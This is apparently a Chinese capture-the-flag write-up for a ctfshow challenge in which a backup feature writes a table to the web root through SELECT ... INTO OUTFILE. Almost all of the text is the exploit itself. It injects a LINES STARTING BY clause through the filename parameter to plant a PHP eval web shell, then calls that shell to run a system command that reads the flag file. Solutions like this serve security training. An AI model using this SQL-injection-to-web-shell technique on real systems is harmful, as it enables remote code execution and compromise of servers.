场景
```
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";   
```
```
在api/dump.php传POST
filename=ma.php' LINES STARTING BY '<?php eval($_GET[1]);?>'#

然后访问url/dump/ma.php

url/dump/ma.php?1=system('cat /flag.here');

```